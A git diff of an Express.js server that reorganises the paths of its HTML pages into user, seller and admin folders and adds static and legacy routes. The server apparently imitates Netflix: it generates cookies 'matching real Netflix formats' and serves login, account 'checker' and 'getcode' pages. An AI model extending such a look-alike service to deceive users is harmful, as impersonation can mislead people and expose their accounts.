@@ -536,25 +536,35 @@ app.use((req, res, next) => {
 app.use(cookieParser());
 app.use(subdomainMiddleware);
 
+// ─── Static pages (public/admin | seller | user) ─────────────────────────────
+const PAGE = {
+  admin: path.join(__dirname, 'public', 'admin', 'index.html'),
+  seller: path.join(__dirname, 'public', 'seller', 'index.html'),
+  user: (name) => path.join(__dirname, 'public', 'user', name),
+};
+
 // ─── Subdomain root routing ────────────────────────────────────────────────────
-// me.domain/      → getcode.html
-// seller.domain/  → seller.html
-// admin.domain/   → admin.html
+// me.domain/      → user/getcode.html
+// seller.domain/  → seller/index.html
+// admin.domain/   → admin/index.html
 // (domain trần)/  → landing (xử lý ở route '/' bên dưới)
 function serveSubdomainRoot(req, res, next) {
   if (req.path !== '/') return next();
   switch (req.subdomain) {
-    case 'me':     return res.sendFile(path.join(__dirname, 'public', 'getcode.html'));
-    case 'seller': return res.sendFile(path.join(__dirname, 'public', 'seller.html'));
-    case 'admin':  return res.sendFile(path.join(__dirname, 'public', 'admin.html'));
+    case 'me':     return res.sendFile(PAGE.user('getcode.html'));
+    case 'seller': return res.sendFile(PAGE.seller);
+    case 'admin':  return res.sendFile(PAGE.admin);
     default:       return next();
   }
 }
 app.use(serveSubdomainRoot);
 
 // index: false so that GET / goes through our route handler (which sets cookies)
-// instead of express.static serving public/index.html directly
+// instead of express.static serving public/user/index.html directly
 app.use(express.static(path.join(__dirname, 'public'), { index: false }));
+// CSS/JS user — URL giữ /css, /js (không đổi link trong HTML)
+app.use('/css', express.static(path.join(__dirname, 'public', 'user', 'css')));
+app.use('/js', express.static(path.join(__dirname, 'public', 'user', 'js')));
 
 // ─── Cookie Generation – matching real Netflix formats ─────────────────────────
 
@@ -816,22 +826,22 @@ function requireProfile(req, res, next) {
 app.get('/', (req, res) => {
   setAnonymousCookies(req, res);
   if (req.cookies.NetflixId && decodeNetflixId(req.cookies.NetflixId)) return res.redirect('/browse');
-  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+  res.sendFile(PAGE.user('index.html'));
 });
 
 app.get('/login', (req, res) => {
   setAnonymousCookies(req, res);
   if (req.cookies.NetflixId && decodeNetflixId(req.cookies.NetflixId)) return res.redirect('/browse');
-  res.sendFile(path.join(__dirname, 'public', 'login.html'));
+  res.sendFile(PAGE.user('login.html'));
 });
 
 app.get('/profiles', requireAuth, (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'profiles.html'));
+  res.sendFile(PAGE.user('profiles.html'));
 });
 
 app.get('/checker', (req, res) => {
   setAnonymousCookies(req, res);
-  res.sendFile(path.join(__dirname, 'public', 'checker.html'));
+  res.sendFile(PAGE.user('checker.html'));
 });
 
 app.get('/browse', requireAuth, requireProfile, (req, res) => {
@@ -843,7 +853,12 @@ app.get('/browse', requireAuth, requireProfile, (req, res) => {
       path: '/',
     });
   }
-  res.sendFile(path.join(__dirname, 'public', 'browse.html'));
+  res.sendFile(PAGE.user('browse.html'));
+});
+
+// Legacy URL (footer landing, link cũ)
+app.get('/getcode.html', (req, res) => {
+  res.sendFile(PAGE.user('getcode.html'));
 });
 
 // ─── API Routes ────────────────────────────────────────────────────────────────
